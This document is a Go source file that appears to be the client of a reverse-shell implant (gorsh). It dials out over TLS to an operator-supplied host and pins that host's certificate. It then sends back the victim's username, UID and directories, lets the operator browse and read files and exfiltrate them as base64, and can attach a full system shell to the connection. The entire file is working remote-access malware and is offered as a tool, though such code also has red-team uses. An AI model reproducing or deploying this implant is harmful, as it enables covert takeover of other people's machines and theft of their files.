package main

import (
	"bufio"
	"bytes"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"net"
	"os"
	"os/exec"
	"os/user"
	"strings"

	"github.com/audibleblink/gorsh/shell"
	"code.cloudfoundry.org/bytefmt"
)

const (
	ERR_COULD_NOT_DECODE = 1 << iota
	ERR_HOST_UNREACHABLE = iota
	ERR_BAD_FINGERPRINT  = iota
)

var (
	connectString string
	fingerPrint   string
)

func Encode(path string) (string, error) {
	buff, err := ioutil.ReadFile(path)
	if err != nil {
		return "", err
	}
	return base64.StdEncoding.EncodeToString(buff), nil
}

func Intel(conn net.Conn) {
	user, _ := user.Current()
	userBlock := fmt.Sprintf("\n[User]\nusername=%s\nid=%s\n", user.Name, user.Uid)

	dir, _ := os.Getwd()
	dirBlock := fmt.Sprintf("\n[Directory]\nCurrent=%s\nHome=%s\n", dir, user.HomeDir)

	conn.Write([]byte(userBlock + dirBlock))
}

// takes a network connection as its arg so it can pass stdio to it
func InteractiveShell(conn net.Conn) {
	var (
		exit    bool   = false
		name, _        = os.Hostname()
		prompt  string = fmt.Sprintf("[%s]> ", name)

		// buffered i/o. stdin/out library
		// TODO: why the asterisk on the scanner type declaration
		scanner *bufio.Scanner = bufio.NewScanner(conn)
	)

	// Print basic recon data on first connect
	Intel(conn)
	// write the byte array that is our prompt to the net connection
	conn.Write([]byte(prompt))

	// looks like the equivalent of a while loop that listens for user
	// input
	for scanner.Scan() {
		// Grab user input
		command := scanner.Text()

		if len(command) > 1 {
			// split the user input on whitespace
			argv := strings.Split(command, " ")

			switch argv[0] {
			case "exit":
				exit = true

			case "shell":
				conn.Write([]byte("Mind your OPSEC\n"))
				RunShell(conn)

			case "ls":
				files, _ := ioutil.ReadDir("./")

				for _, f := range files {
					perms := f.Mode().String()
					size := bytefmt.ByteSize(uint64(f.Size()))
					modTime := f.ModTime().String()[0:19]
					name := f.Name()
					conn.Write([]byte(perms + "\t" + modTime + "\t" + size + "\t" + name + "\n"))
				}
				conn.Write([]byte("\n"))

			case "cd":
				os.Chdir(argv[1])
				dir, _ := os.Getwd()
				conn.Write([]byte("Directory: " + dir + "\n"))

			case "pwd":
				dir, _ := os.Getwd()
				conn.Write([]byte(dir + "\n"))

			case "cat":
				buf, err := ioutil.ReadFile(argv[1])

				if err != nil {
					conn.Write([]byte(err.Error()))
				} else {
					conn.Write([]byte("\n" + string(buf) + "\n\n"))
				}

			case "base64":
				base64, err := Encode(argv[1])

				if err != nil {
					conn.Write([]byte(err.Error()))
				} else {
					conn.Write([]byte("\n" + base64 + "\n\n"))
				}

			case "help":
				conn.Write([]byte("Currently implemented commands: \n" +
					"cd <path>     -  Change the processe's working directory\n" +
					"ls            -  List the current working directory\n" +
					"pwd           -  Print the current working directory\n" +
					"cat <file>    -  Print the contents of the given file\n" +
					"base64 <file> -  Base64 encode the given file and print\n\n"))
			default:
				conn.Write([]byte("Command not implemented. Try 'help'\n"))
			}

			if exit {
				break
			}

		}

		conn.Write([]byte(prompt))
	}
}

func RunShell(conn net.Conn) {
	var cmd *exec.Cmd = shell.GetShell()
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Stdin = conn
	cmd.Run()
}

func CheckKeyPin(conn *tls.Conn, fingerprint []byte) (bool, error) {
	valid := false
	connState := conn.ConnectionState()
	for _, peerCert := range connState.PeerCertificates {
		hash := sha256.Sum256(peerCert.Raw)
		if bytes.Compare(hash[0:], fingerprint) == 0 {
			valid = true
		}
	}
	return valid, nil
}

// Create the TLS connection before passing it to the InteractiveShell function
func Reverse(connectString string, fingerprint []byte) {
	var (
		conn *tls.Conn
		err  error
	)

	config := &tls.Config{InsecureSkipVerify: true}

	if conn, err = tls.Dial("tcp", connectString, config); err != nil {
		os.Exit(ERR_HOST_UNREACHABLE)
	}

	defer conn.Close()

	if ok, err := CheckKeyPin(conn, fingerprint); err != nil || !ok {
		os.Exit(ERR_BAD_FINGERPRINT)
	}

	InteractiveShell(conn)
}

func main() {
	if connectString != "" && fingerPrint != "" {
		fprint := strings.Replace(fingerPrint, ":", "", -1)
		bytesFingerprint, err := hex.DecodeString(fprint)
		if err != nil {
			os.Exit(ERR_COULD_NOT_DECODE)
		}
		Reverse(connectString, bytesFingerprint)
	}
}
